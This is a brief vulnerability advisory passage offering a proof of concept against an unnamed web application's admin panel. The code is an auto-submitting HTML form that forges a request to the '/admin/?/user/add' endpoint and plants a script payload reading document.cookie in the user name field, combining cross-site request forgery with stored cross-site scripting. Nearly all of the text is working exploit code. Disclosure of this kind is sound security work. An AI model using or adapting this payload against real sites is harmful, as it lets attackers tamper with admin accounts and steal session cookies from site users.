An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/?/user/add" method="post" name="main">
<input type="hidden" name="user[name]" value='"><script>alert(document.cookie)</script>'>
<input type="hidden" name="user[email]" value="">
<input type="hidden" name="user[username]" value="">
<input type="hidden" name="user[password]" value="">
<input type="hidden" name="user[confirm]" value="">
<input type="hidden" name="user[language]" value="pl">
<input type="hidden" name="commit" value="Save">
</form>
<script>
document.main.submit();
</script>
